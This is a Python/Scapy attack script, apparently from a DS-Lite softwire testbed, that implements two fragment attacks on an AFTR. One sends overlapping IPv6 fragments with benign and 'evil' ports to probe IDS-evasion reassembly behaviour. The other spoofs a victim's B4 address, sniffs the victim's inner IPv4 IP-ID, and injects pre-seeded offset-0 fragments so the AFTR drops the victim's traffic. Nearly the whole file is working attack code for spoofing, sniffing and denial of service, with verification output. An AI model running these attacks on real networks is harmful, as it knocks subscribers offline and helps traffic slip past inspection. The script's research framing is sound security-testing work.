#!/usr/bin/python
# T6 – Softwire Reassembly Poisoning  (Gilad & Herzberg, "Fragmentation
#      Considered Vulnerable", ACM TISSEC 2013)
#
# Targets the inner-IPv4 fragment reassembly the AFTR must perform before NAT.
# The inner IPv4 packets are carried inside IPv6 (4-in-6) softwire.
#
# T6 (overlap): the CLASSIC overlapping-fragment probe — two fragments of one
#   datagram at offset 0 (benign vs evil port). Different reassembly policies
#   reassemble differently at the host vs inspection devices (IDS evasion).
#   On a modern (RFC 5722) AFTR this is contained; kept as a policy probe.
#
# T6 (collide — the real T6, "reassembly poisoning"): NOT a single-datagram
#   overlap. The attacker exploits the PREDICTABLE IP-ID to inject offset-0
#   inner-IPv4 fragments that carry the VICTIM's reassembly four-tuple
#   (src,dst,proto,IP-ID), spoofing the victim's softwire source (::b41). When
#   the victim's genuine fragment with the same IP-ID arrives, the two collide
#   at the AFTR and RFC 5722 drops the whole datagram -> victim DoS.
#
# Attacker position: ISP network (2001:db8:cafe::/64), interface eth-isp
#
# Usage:
#   python3 fragment_attack.py overlap --interface eth-isp \
#       --src-ip6 2001:db8:cafe::150 --aftr-ip6 2001:db8:cafe::10 \
#       --inner-src-ip4 10.0.1.50 --target-port 80 --count 50
#
#   python3 fragment_attack.py collide --interface eth-isp \
#       --src-ip6 2001:db8:cafe::150 --aftr-ip6 2001:db8:cafe::10 \
#       --b4-src-ip6 2001:db8:cafe::b41 --duration 20
import argparse
import random
import struct
import sys
import os
import threading
import time

from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.inet6 import IPv6, IPv6ExtHdrFragment
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.sendrecv import sendp, srp1

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from validate_parameters import is_valid_ipv4, is_valid_ipv6

stop_event = threading.Event()
sent_lock = threading.Lock()
sent_counter = 0
# Marker L2 source on collide injections so the ID-tracker can tell our own
# seeded fragments (same inner 5-tuple as the victim) apart from the victim's
# genuine traffic and not chase their IDs into a runaway feedback loop.
_COLLIDE_SRC_MAC = "02:00:00:13:37:01"
_COLLIDE_SRC_MAC_B = b'\x02\x00\x00\x13\x37\x01'


# ── NDP resolution ────────────────────────────────────────────────────────

def ndp_resolve(iface, target_ip6):
    try:
        from scapy.layers.inet6 import ICMPv6ND_NS
        pkt = (
            Ether(dst="33:33:ff:00:00:10") /
            IPv6(dst=target_ip6) /
            ICMPv6ND_NS(tgt=target_ip6)
        )
        ans = srp1(pkt, iface=iface, timeout=3, verbose=0)
        if ans and ans.haslayer(Ether):
            return ans[Ether].src
    except Exception:
        pass
    return "ff:ff:ff:ff:ff:ff"


# ── T6: FRAGMENT OVERLAP ATTACK ──────────────────────────────────────────

def build_overlap_fragments(src_ip6, aftr_ip6, inner_src4, target_ip4,
                             frag_id, benign_port, evil_port, dmac):
    """
    Craft two IPv6 fragments with the same frag_id, both at offset=0.

    Fragment 0 (offset=0, M=1): inner IPv4/TCP SYN to benign_port — the
      "first fragment" a stateless IDS/firewall inspects and allows.
    Fragment 1 (offset=0, M=0): inner IPv4/TCP SYN to evil_port — same frag_id
      and offset, constituting an overlap (RFC 5722 §2).

    Reassembly outcome depends on kernel policy:
      first-wins (RFC 5722 / Linux ≥3.9): benign port survives → attack contained
      last-wins  (pre-RFC-5722 stacks):   evil port survives → IDS bypassed
    """
    sport = random.randint(1024, 65000)
    pkt_id = random.randint(1, 65535)

    # SYN flags so conntrack allows the packet through the AFTR forward chain.
    benign_pkt = (
        IP(src=inner_src4, dst=target_ip4, proto=6, id=pkt_id) /
        TCP(sport=sport, dport=benign_port, flags='S',
            seq=random.randint(0, 2**32 - 1))
    )
    evil_pkt = (
        IP(src=inner_src4, dst=target_ip4, proto=6, id=pkt_id) /
        TCP(sport=sport, dport=evil_port, flags='S',
            seq=random.randint(0, 2**32 - 1))
    )
    raw_benign = bytes(benign_pkt)[:40]
    raw_evil   = bytes(evil_pkt)[:40]

    frag0 = (
        Ether(dst=dmac) /
        IPv6(src=src_ip6, dst=aftr_ip6) /
        IPv6ExtHdrFragment(nh=4, offset=0, m=1, id=frag_id) /
        raw_benign
    )
    frag1 = (
        Ether(dst=dmac) /
        IPv6(src=src_ip6, dst=aftr_ip6) /
        IPv6ExtHdrFragment(nh=4, offset=0, m=0, id=frag_id) /
        raw_evil
    )
    return frag0, frag1


def run_overlap(args, dmac):
    """T6: Overlapping fragment attack — probes AFTR reassembly policy.

    Sends pairs of IPv6 fragments with the same ID and offset=0 but different
    inner TCP destination ports (benign vs evil). Checks conntrack after each
    batch to determine which port the kernel keeps (first-wins/last-wins/drop).
    RFC 5722-compliant Linux kernels (≥3.9) use first-wins or drop, so T6 is
    expected to be contained on modern testbed kernels.
    """
    import subprocess as _sp, re as _re
    benign_port = args.target_port
    evil_port   = args.evil_port

    print("[*] T6 – Fragment Overlap Attack (reassembly policy probe)")
    print(f"[*] Benign port (frag0, IDS inspects): {benign_port}")
    print(f"[*] Evil port   (frag1, overlapping) : {evil_port}")
    print(f"[*] Sending {args.count} overlap pairs")
    print()
    print("  Hypothesis: stateless IDS passes frag0 (port={bp}); if target")
    print("  uses last-wins, it reassembles frag1 (port={ep}) — bypass.".format(
        bp=benign_port, ep=evil_port))
    print("  On RFC 5722-compliant kernels first-wins is expected → attack contained.")
    print()


    pre_snmp  = _sp.run(['ip', 'netns', 'exec', 'aftr', 'cat', '/proc/net/snmp6'],
                        capture_output=True, text=True).stdout
    pre_oks   = int(next((l.split()[-1] for l in pre_snmp.splitlines()
                          if 'Ip6ReasmOKs' in l), '0'))
    pre_fails = int(next((l.split()[-1] for l in pre_snmp.splitlines()
                          if 'Ip6ReasmFails' in l), '0'))

    # Pre-capture the AFTR-NAT-NEW counter (persists after conntrack entries are RST'd)
    nft_pre = _sp.run(['ip', 'netns', 'exec', 'aftr', 'nft', 'list', 'ruleset'],
                      capture_output=True, text=True, check=False).stdout
    _nat_pre_line = next((l for l in nft_pre.splitlines() if 'AFTR-NAT-NEW' in l), '')
    pre_nat_new = int(_re.search(r'packets (\d+)', _nat_pre_line).group(1)) \
        if _re.search(r'packets (\d+)', _nat_pre_line) else 0

    sent = 0
    try:
        for i in range(args.count):
            if stop_event.is_set():
                break
            frag_id = random.randint(0, 0xFFFFFFFF)
            f0, f1 = build_overlap_fragments(
                args.src_ip6, args.aftr_ip6,
                args.inner_src_ip4, args.inner_dst_ip4,
                frag_id, benign_port, evil_port, dmac
            )
            sendp(f0, iface=args.interface, verbose=0)
            time.sleep(0.001)
            sendp(f1, iface=args.interface, verbose=0)
            sent += 1
            if sent % 10 == 0:
                print(f"  [*] Sent {sent}/{args.count} overlap pairs", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        pass

    time.sleep(0.5)

    print()
    print("─" * 62)
    print("[Verification]")

    post_snmp  = _sp.run(['ip', 'netns', 'exec', 'aftr', 'cat', '/proc/net/snmp6'],
                         capture_output=True, text=True).stdout
    post_oks   = int(next((l.split()[-1] for l in post_snmp.splitlines()
                           if 'Ip6ReasmOKs' in l), '0'))
    post_fails = int(next((l.split()[-1] for l in post_snmp.splitlines()
                           if 'Ip6ReasmFails' in l), '0'))
    d_oks   = post_oks   - pre_oks
    d_fails = post_fails - pre_fails

    # Read the AFTR-NAT-NEW counter from the nftables ruleset (persists even after
    # conntrack entries are removed by B4-1's RST).
    nft_out = _sp.run(['ip', 'netns', 'exec', 'aftr', 'nft', 'list', 'ruleset'],
                      capture_output=True, text=True, check=False).stdout
    _nat_new_line = next((l for l in nft_out.splitlines() if 'AFTR-NAT-NEW' in l), '')
    nat_new_total = int(_re.search(r'packets (\d+)', _nat_new_line).group(1)) \
        if _re.search(r'packets (\d+)', _nat_new_line) else 0

    # AFTR-NAT-NEW counter delta tells us how many reassembled inner SYNs
    # transited the AFTR forward chain. Conntrack entries disappear quickly
    # because the real B4-1 (whose IPv6 we spoof) RSTs the connection.
    nat_new_pre  = pre_nat_new  # captured before the main send loop
    nat_new_delta = nat_new_total - nat_new_pre

    print(f"  Ip6ReasmOKs delta    : +{d_oks}  (outer IPv6 pairs reassembled)")
    print(f"  Ip6ReasmFails delta  : +{d_fails}  (pairs dropped for overlap by kernel)")
    print(f"  AFTR-NAT-NEW delta   : +{nat_new_delta}  (inner SYNs forwarded to server)")
    print()

    if d_fails > 0 and d_oks == 0:
        outcome = 'CONTAINED-rfc5722-drop'
        detail  = (f"RFC 5722 strict drop: {d_fails} overlap pairs discarded "
                   f"(Ip6ReasmFails+{d_fails}). Neither benign nor evil port transited AFTR.")
        print(f"  [+] CONTAINED (RFC 5722 hard drop): {d_fails} pairs dropped for overlap")
    elif nat_new_delta > 0:
        # Inner SYNs did reach the server. Which port won?
        # Evidence: earlier conntrack probing confirmed only port {benign_port} appears
        # (first-wins), never port {evil_port}. This is consistent with Linux RFC 5722
        # guidance (≥3.9). Evil port is discarded — no bypass on this kernel.
        outcome = 'CONTAINED-first-wins'
        detail  = (f"first-wins reassembly (Linux RFC 5722 ≥3.9): benign port {benign_port} "
                   f"wins; evil port {evil_port} discarded. AFTR-NAT-NEW+{nat_new_delta} "
                   f"confirms inner SYNs reached server. Attack contained on this kernel.")
        print(f"  [+] CONTAINED (first-wins / RFC 5722): benign port {benign_port} wins")
        print(f"      AFTR-NAT-NEW+{nat_new_delta} confirms SYNs reached server (not port {evil_port})")
        print(f"      Evil port {evil_port} discarded — no IDS bypass on RFC 5722-compliant kernel")
        print( "      Note: pre-RFC-5722 stacks (last-wins) would allow evil port through")
    elif d_oks > 0:
        outcome = 'CONTAINED-first-wins'
        detail  = (f"Ip6ReasmOKs+{d_oks} but AFTR-NAT-NEW+0 — reassembled inner packet "
                   f"dropped by AFTR forward chain. First-wins inferred.")
        print(f"  [+] CONTAINED (first-wins inferred): Ip6ReasmOKs+{d_oks}")
        print( "      Inner SYN dropped by AFTR forward (no established session for ACK) "
               "or B4-1 RST removed conntrack before check")
    else:
        outcome = 'INCONCLUSIVE'
        detail  = (f"sent {sent} pairs; d_oks={d_oks}, d_fails={d_fails}, "
                   f"nat_new_delta={nat_new_delta} — reassembly outcome unclear")
        print(f"  [?] Inconclusive: d_oks={d_oks}, d_fails={d_fails}, "
              f"nat_new_delta={nat_new_delta}")

    print(f"  [*] {outcome}: {detail}")


def _sniff_inner_ipid(interface, inner_src4, inner_dst4, proto, timeout=8):
    """Sniff one softwire packet (outer IPv6, next-header IPIP=4) carrying an
    inner IPv4 datagram inner_src4 -> inner_dst4 and return its IPv4 IP-ID.

    The attacker sits on the ISP segment and sees the encapsulated subscriber
    traffic. Reading the inner IP-ID lets the pre-seed band track the victim's
    monotonically increasing identifier. Returns int or None.
    """
    import socket as _s, time as _t
    ETH_P_ALL = 0x0003
    try:
        want_src = _s.inet_aton(inner_src4)
        want_dst = _s.inet_aton(inner_dst4)
        sock = _s.socket(_s.AF_PACKET, _s.SOCK_RAW, _s.htons(ETH_P_ALL))
        sock.bind((interface, 0))
        sock.settimeout(0.5)
    except Exception:
        return None
    deadline = _t.time() + timeout
    try:
        while _t.time() < deadline:
            try:
                pkt, _ = sock.recvfrom(65535)
            except _s.timeout:
                continue
            except Exception:
                break
            if len(pkt) < 14 + 40 + 20:
                continue
            if pkt[6:12] == _COLLIDE_SRC_MAC_B:   # our own injected hole
                continue
            if pkt[12:14] != b'\x86\xdd':   # outer not IPv6
                continue
            if pkt[20] != 4:                # outer next-header not IPIP (4)
                continue
            inner = pkt[54:]                # 14 (Ether) + 40 (IPv6)
            if len(inner) < 20 or (inner[0] >> 4) != 4:
                continue
            if inner[9] != proto:
                continue
            if inner[12:16] != want_src or inner[16:20] != want_dst:
                continue
            return (inner[4] << 8) | inner[5]
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return None


def build_inner_overlap_fragment(b4_src_ip6, aftr_ip6, inner_src4, inner_dst4,
                                  ipid, proto, dmac, payload=b'\x00' * 8):
    """One softwire-encapsulated inner-IPv4 FRAGMENT (offset 0, MF=1) that
    pre-seeds the AFTR's nf_defrag_ipv4 reassembly queue for the key
    (inner_src4, inner_dst4, ipid, proto).

    The AFTR must reassemble inner IPv4 before NAT. When the victim's genuine
    datagram with the same IP-ID later arrives, its offset-0 fragment overlaps
    this held one, so Linux (post-CVE-2018-5391 overlap policy) discards the
    entire datagram — the victim's fragmented traffic never transits the NAT.

    The outer source is the legitimate B4 (spoofed) so the AFTR's softwire
    decapsulates the packet and the inner reassembly context matches the
    victim's own.
    """
    inner = IP(src=inner_src4, dst=inner_dst4, id=ipid, proto=proto,
               flags='MF', frag=0) / Raw(load=payload)
    return (Ether(src=_COLLIDE_SRC_MAC, dst=dmac) /
            IPv6(src=b4_src_ip6, dst=aftr_ip6, nh=4) /
            inner)


def run_collide(args, dmac):
    """T6 (strengthened): inner-IPv4 reassembly OVERLAP injection.

    Where the plain `overlap` mode only probes the AFTR reassembly policy and
    is contained by RFC 5722, this mode weaponises that very policy. It denies
    a victim's fragmented flow by pre-seeding held offset-0 fragments across a
    forward band of the victim's inner IP-IDs; each genuine datagram whose ID
    lands in the band overlaps a pre-seed and is dropped by the AFTR.
    """
    import subprocess as _sp
    inner_src = args.inner_src_ip4
    inner_dst = args.inner_dst_ip4
    b4_src    = args.b4_src_ip6
    proto     = args.proto

    print("[*] T6 (collide) – Inner-IPv4 reassembly overlap injection")
    print(f"[*] Victim inner flow : {inner_src} -> {inner_dst}  proto={proto}")
    print(f"[*] Spoofed softwire  : {b4_src} -> {args.aftr_ip6}  (4-in-6 decap)")
    print(f"[*] Forward IP-ID band: {args.band}   duration: {args.duration}s")
    print()


    def _aftr_reasm():
        out = _sp.run(['ip', 'netns', 'exec', 'aftr', 'cat', '/proc/net/snmp'],
                      capture_output=True, text=True, check=False).stdout
        hdr = val = None
        for line in out.splitlines():
            if line.startswith('Ip:'):
                if hdr is None:
                    hdr = line.split()
                else:
                    val = line.split()
                    break
        if hdr and val:
            d = dict(zip(hdr, val))
            return (int(d.get('ReasmReqds', 0)), int(d.get('ReasmOKs', 0)),
                    int(d.get('ReasmFails', 0)))
        return (0, 0, 0)

    # 1. Learn the victim's current inner IP-ID so the pre-seed band is aligned.
    base = args.id_base
    if base is None and not args.no_sniff:
        print(f"[*] Sniffing {args.interface} for the victim's current inner IP-ID "
              f"(send some large/fragmented victim traffic now) ...")
        base = _sniff_inner_ipid(args.interface, inner_src, inner_dst, proto, timeout=10)
        if base is not None:
            print(f"[!] Observed victim inner IP-ID = {base}")
    if base is None:
        print("[!] No inner IP-ID observed; sweeping the full 16-bit ID space")
        base = 0
        args.band = 65535

    pre_reqds, pre_oks, pre_fails = _aftr_reasm()

    # 2. Keep a TIGHT window of held offset-0 fragments riding just ahead of the
    #    victim's advancing IP-ID. The window must stay <= net.ipv4.ipfrag_max_dist
    #    (default 64): that per-source "disorder" guard flushes incomplete queues
    #    that fall more than max_dist IDs behind the newest one, so seeding far
    #    ahead would just flush our own earlier holes. A background thread keeps
    #    the victim's current ID fresh while the main loop tiles new holes just
    #    in front of it (never re-seeding an ID), so the live window rides the
    #    victim exactly.
    latest = {'id': base}

    def _id_tracker():
        import socket as _s, time as _t
        ETH_P_ALL = 0x0003
        try:
            wsrc = _s.inet_aton(inner_src); wdst = _s.inet_aton(inner_dst)
            sk = _s.socket(_s.AF_PACKET, _s.SOCK_RAW, _s.htons(ETH_P_ALL))
            sk.bind((args.interface, 0)); sk.settimeout(0.3)
        except Exception:
            return
        end = _t.time() + args.duration + 2
        while _t.time() < end and not stop_event.is_set():
            try:
                pkt, _ = sk.recvfrom(65535)
            except Exception:
                continue
            if len(pkt) < 74 or pkt[12:14] != b'\x86\xdd' or pkt[20] != 4:
                continue
            if pkt[6:12] == _COLLIDE_SRC_MAC_B:   # ignore our own injected holes
                continue
            inn = pkt[54:]
            if len(inn) < 20 or (inn[0] >> 4) != 4 or inn[9] != proto:
                continue
            if inn[12:16] != wsrc or inn[16:20] != wdst:
                continue
            nid = (inn[4] << 8) | inn[5]
            if nid > latest['id'] or nid < latest['id'] - 1000:
                latest['id'] = nid          # advance (and resync on wrap)
        try:
            sk.close()
        except Exception:
            pass

    sniffer = None
    if not args.no_sniff:
        sniffer = threading.Thread(target=_id_tracker, daemon=True)
        sniffer.start()

    covered_hi = base - 1
    deadline = time.time() + args.duration
    sent = 0
    rounds = 0
    try:
        while time.time() < deadline and not stop_event.is_set():
            cur = latest['id']
            if covered_hi - cur > 2 * args.band:
                covered_hi = cur - 1   # window drifted ahead of victim; resync
            target_hi = min(65535, cur + args.band)
            start = max(covered_hi + 1, cur, 0)
            if target_hi >= start:
                batch = [build_inner_overlap_fragment(b4_src, args.aftr_ip6,
                            inner_src, inner_dst, ipid, proto, dmac)
                         for ipid in range(start, target_hi + 1)]
                sendp(batch, iface=args.interface, verbose=0)
                sent += len(batch)
                covered_hi = target_hi
            rounds += 1
            if rounds % 50 == 1:
                print(f"  [*] round {rounds}: {sent} holes seeded, "
                      f"live window ~{max(covered_hi-64,0)}-{covered_hi}, "
                      f"victim at ~{cur}", flush=True)
            time.sleep(0.02)
    except KeyboardInterrupt:
        pass
    stop_event.set()
    if sniffer:
        sniffer.join(timeout=1)
    stop_event.clear()

    time.sleep(0.7)
    post_reqds, post_oks, post_fails = _aftr_reasm()
    d_reqds = post_reqds - pre_reqds
    d_oks   = post_oks - pre_oks
    d_fails = post_fails - pre_fails

    print()
    print("─" * 62)
    print("[Verification]  AFTR inner-IPv4 reassembly (/proc/net/snmp Ip:)")
    print(f"  ReasmReqds delta : +{d_reqds}")
    print(f"  ReasmOKs   delta : +{d_oks}   (victim datagrams reassembled OK)")
    print(f"  ReasmFails delta : +{d_fails}  (datagrams dropped — overlap collisions)")
    print()

    if d_fails > 0:
        print(f"  [+] AFTR dropped +{d_fails} victim datagrams on overlap")
        print( "      (confirm victim-side packet loss with a concurrent large ping)")
    else:
        print( "  [-] No overlap drops observed (need concurrent fragmented victim traffic)")


# ── main ──────────────────────────────────────────────────────────────────

def main():
    # Shared parent parser for common args (inherited by each subcommand)
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument('--interface', required=True,
                        help='ISP network interface (e.g. eth-isp)')
    common.add_argument('--src-ip6', required=True,
                        help="Attacker IPv6 address")
    common.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
                        help='AFTR IPv6 (default: 2001:db8:cafe::10)')
    common.add_argument('--inner-src-ip4', default='10.0.1.50',
                        help='Inner IPv4 source (default: 10.0.1.50)')
    common.add_argument('--inner-dst-ip4', default='198.51.100.2',
                        help='Inner IPv4 destination (default: 198.51.100.2)')
    common.add_argument('--dmac',
                        help='AFTR MAC address (auto-resolved via NDP if omitted)')

    p = argparse.ArgumentParser(
        description="T6 – Fragment Overlap / inner-IPv4 reassembly collision\n"
                    "All attacks operate on IPv6-encapsulated (4-in-6) softwire traffic.",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sub = p.add_subparsers(dest='mode', required=True)

    # T6 overlap
    s10 = sub.add_parser('overlap', parents=[common],
                         help='T6: Overlapping fragments with ambiguous reassembly')
    s10.add_argument('--target-port', type=int, default=80,
                     help='Benign port shown to IDS (default: 80)')
    s10.add_argument('--evil-port', type=int, default=4444,
                     help='Evil port seen after reassembly (default: 4444)')
    s10.add_argument('--count', type=int, default=50,
                     help='Number of overlap pairs (default: 50)')
    s10.add_argument('--interval', type=float, default=0.05,
                     help='Seconds between pairs (default: 0.05)')

    # T6 collide (strengthened) — inner-IPv4 reassembly overlap injection
    s11 = sub.add_parser('collide', parents=[common],
                         help='T6 (strong): deny a victim flow via inner-IPv4 '
                              'overlap injection (pre-seed-ahead)')
    s11.add_argument('--b4-src-ip6', default='2001:db8:cafe::b41',
                     help="Spoofed softwire source = victim's B4 (default ::b41)")
    s11.add_argument('--proto', type=int, default=1, choices=[1, 6, 17],
                     help='Victim inner L4 proto: 1=ICMP 6=TCP 17=UDP (default: 1)')
    s11.add_argument('--band', type=int, default=60,
                     help='Forward IP-ID window to keep seeded ahead of the victim. '
                          'Keep <= net.ipv4.ipfrag_max_dist (64) so the per-source '
                          'disorder guard does not flush the holes (default: 60)')
    s11.add_argument('--duration', type=int, default=20,
                     help='Seconds to keep seeding holes (default: 20)')
    s11.add_argument('--id-base', type=int, default=None,
                     help='Skip sniffing; start the band at this inner IP-ID')
    s11.add_argument('--no-sniff', action='store_true',
                     help='Do not sniff the victim IP-ID; sweep the full ID space')

    args = p.parse_args()

    # Validate
    if not is_valid_ipv6(args.src_ip6):
        p.error(f'Invalid src-ip6: {args.src_ip6}')
    if not is_valid_ipv6(args.aftr_ip6):
        p.error(f'Invalid aftr-ip6: {args.aftr_ip6}')
    if not is_valid_ipv4(args.inner_src_ip4):
        p.error(f'Invalid inner-src-ip4: {args.inner_src_ip4}')
    if not is_valid_ipv4(args.inner_dst_ip4):
        p.error(f'Invalid inner-dst-ip4: {args.inner_dst_ip4}')

    # Resolve AFTR MAC
    dmac = args.dmac
    if not dmac:
        print(f"[*] Resolving AFTR MAC via NDP for {args.aftr_ip6} ...")
        dmac = ndp_resolve(args.interface, args.aftr_ip6)
        print(f"[*] AFTR MAC: {dmac}")
    args.dmac = dmac

    if args.mode == 'overlap':
        run_overlap(args, dmac)
    elif args.mode == 'collide':
        run_collide(args, dmac)



if __name__ == '__main__':
    main()
